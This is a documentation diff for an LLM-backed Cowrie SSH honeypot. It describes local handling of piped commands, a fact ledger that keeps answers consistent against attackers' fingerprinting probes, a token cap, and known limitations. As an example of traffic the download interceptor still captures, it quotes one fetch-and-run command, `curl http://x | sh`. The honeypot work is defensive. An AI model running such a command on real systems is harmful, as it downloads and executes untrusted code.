@@ -200,6 +200,46 @@ registry rather than naming providers.
   common probe commands). Anything unrecognized — and any file the session
   has actually modified — falls through to the LLM unchanged. Toggle with
   `[llm] deterministic_responses` (default on).
+- **Simple pipelines stay local.** The responder used to decline any
+  command containing a `|`, so `free -m` was answered instantly and for
+  free while `free -m | head -2` went to the model. Measured across the
+  `attacker_sim` corpus that was **19% of all model-bound traffic** — and
+  it included two of the three repeat probes in `FINGERPRINT_PROBE`, the
+  adversary written specifically to catch the honeypot contradicting
+  itself, so the consistency test was being routed to the component least
+  able to stay consistent. `cowrie/llm/pipefilters.py` now runs the command
+  locally and applies `head`/`tail`/`grep`/`wc` the way a real shell would.
+  Model-bound share falls 48% → 39%; all three fingerprint re-probes now
+  answer deterministically. Deliberately conservative: the first stage must
+  be a command the emulator recognizes (so `curl http://x | sh` still
+  reaches the download interceptor and its payload is still captured), and
+  an unmodelled filter or flag defers the whole pipeline rather than
+  guessing. `ls` is piped-aware, since real `ls` drops its column layout
+  when stdout is not a tty — without that, `ls | wc -l` would report 1
+  instead of the entry count and trade one fingerprint for another. Toggle
+  with `[llm] pipe_filters` (default on).
+- **Fact ledger: repeated questions get the same answer.** An attacker
+  probing for a honeypot asks the same thing twice and compares. The model
+  could not reliably comply: `history_window_turns` replays only the last
+  16 turns and deterministic renders are excluded from it entirely, so a
+  fact asserted 20 turns earlier was simply re-invented. WorldState now
+  records what the session was told, keyed by *fact family* rather than
+  command text (`cowrie/llm/factkeys.py`), so `uname -a`, `uname -r` and
+  `cat /proc/version` count as one question — and `free -m | head -2` keys
+  the same as `free -m`, which is what makes a re-probe in piped form
+  detectable. Only model-generated answers are replayed into the prompt;
+  what the emulator produced reproduces itself, so echoing it back would
+  cost input tokens every turn and buy nothing. Commands whose answer is
+  *meant* to change (`date`, `w`, `top`) are never tracked, since recording
+  them would manufacture a contradiction out of correct behaviour. Toggle
+  with `[llm] fact_ledger` (default on).
+- **Per-session token cap.** `max_commands_per_session` counts turns; a
+  session of long outputs can cost more than two hundred short ones. New
+  `[llm] max_tokens_per_session` (0 = unlimited, the default) bounds actual
+  spend, summed from what the provider reported rather than estimated. On
+  exhaustion the session degrades to a plausible resource error and keeps
+  going — deterministic commands cost nothing and keep working, so a
+  capped-out session stays usable rather than dead.
 - **Hardened system prompt.** `cowrie/llm/prompts.py` replaces the old
   two-sentence "simulate a Linux server" default with an explicit
   behavioral contract: output discipline (stdout/stderr bytes only, no
@@ -377,6 +417,33 @@ coverage report --include='*/cowrie/llm/*'
   more realistic for `tail -f`-like commands. Trade-off: markdown
   stripping + observation-leak redaction run at end-of-stream rather
   than per chunk.
+- **Pipeline filters are approximations, and only four of them.**
+  `head`, `tail`, `grep` and `wc` are modelled; anything else — `awk`,
+  `sed`, `sort`, `cut`, `xargs` — defers the whole pipeline to the model,
+  so the failure mode is "slower", never "wrong". `grep` compiles patterns
+  with Python's `re`, not POSIX BRE/ERE, so `-E` and `-P` are refused
+  rather than approximated; an attacker comparing `grep` dialect behaviour
+  precisely could still tell. Only single-command pipelines are handled —
+  no redirection, no `&&`/`;`/`$()`.
+- **The fact ledger reduces contradictions; it cannot prevent them.** It
+  records what we said and shows the model its own earlier answer with an
+  instruction to repeat. It cannot *force* compliance, because we
+  deliberately do not parse model output (`cmd_parser.py`'s ABOUTME
+  explains why that judgement stands). Commands with no recognized fact
+  family are not tracked at all, and the prompt block is capped at
+  `max_facts_in_prompt` — an attacker who probes more distinct facts than
+  that will push the oldest out.
+- **Token accounting misses non-interactive exec and lags one turn.**
+  `ssh host 'cmd'` uses a legacy code path that never builds an
+  `LLMRequest`, so its spend is invisible to `max_tokens_per_session`. And
+  usage is only known after a response lands, so the cap is checked against
+  what previous turns cost and can overshoot by a single response.
+- **The LangChain provider queues under concurrency.** It bridges a
+  synchronous library onto Twisted with `deferToThread`, consuming one
+  worker from the default pool of ten per in-flight call. The native HTTP
+  providers are fully async and have no such ceiling. Measure before
+  pointing a busy sensor at it. It is also a large transitive dependency
+  tree on an internet-facing host, which is why it is an optional extra.
 - **The minimax response planner is present but not wired in.**
   `cowrie/llm/planner/` implements a depth-limited minimax search over
   response policies, with alpha-beta pruning proven equivalent to a plain
